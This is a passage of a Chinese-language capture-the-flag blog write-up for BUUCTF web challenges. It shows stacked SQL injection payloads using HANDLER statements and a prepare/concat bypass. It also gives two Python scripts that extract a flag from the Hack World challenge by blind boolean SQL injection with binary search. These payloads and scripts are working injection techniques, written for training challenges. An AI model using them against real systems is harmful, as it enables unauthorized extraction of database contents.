+<p>?inject&#x3D;1’;handler FlagHere open;handler FlagHere read first;</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546593269-028e75cb-4395-44b3-88a7-83dc19133d21.png" alt="img"></p>
+<p>因为这题禁用了prepare，不然可以用预编译：</p>
+<p>1’;prepare a from concat(‘s’,’elect * from FlagHere’);excute a;#</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>经过测试当结果为1的时候</p>
+<p>输出： Hello, glzjin wants a girlfriend.  </p>
+<p>当结果为2的时候</p>
+<p>输出： Do you want to be my girlfriend?  </p>
+<p>当结果为其他的时候</p>
+<p>输出：  Error Occured When Fetch Result.  </p>
+<p>当用联合查询的时候，出现了waf，于是就用fuzz跑一下</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550848752-b9fb5c93-5355-4811-b681-51d0a1ab4dfc.png" alt="img"></p>
+<p>这些都过滤了：</p>
+<p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733905198815-88dbee96-527d-4434-93e7-c81e858cc81e.png" alt="img"></p>
+<p>直接上脚本。</p>
+<p>·</p>
+<pre><code class="language-plain"># 二分法
+import requests
+
+url = &quot;http://75073420-9c74-41e5-b9fb-6bfe86d0efc8.node5.buuoj.cn:81/index.php&quot;
+flag = &quot;&quot;
+i = 0
+
+while True:
+    i = i + 1
+    letf = 32
+    right = 127
+    while letf &lt; right:
+        mid = (letf+right) // 2
+        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;
+        data = &#123;&quot;id&quot;:payload&#125; 
+        res = requests.post(url=url, data=data).text
+        if &quot;Hello&quot; in res:
+            letf = mid + 1
+        else:
+            right = mid
+    if letf != 32:
+        flag += chr(letf)	
+        print(flag)
+    else:
+        break
+import requests
+
+url = &#39;http://0f594c63-4512-421d-94e3-5f261e2e70fa.node5.buuoj.cn:81/&#39;
+flag = &#39;&#39;
+for x in range(1, 50):
+    high = 137
+    low = 32
+    mid = (low + high) // 2
+    while high &gt; low:
+        payload = &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)
+        data = &#123;
+            &quot;id&quot;: payload
+        &#125;
+        response = requests.post(url, data=data)
+        if &#39;Hello&#39; in response.text:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+    flag += chr(int(mid))
+    print(flag)
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 jujub3
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;jujub3
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="jujub3/jujub3.github.io"
+    data-repo-id="R_kgDOOQ-ONw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOOQ-ON84ComAd"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
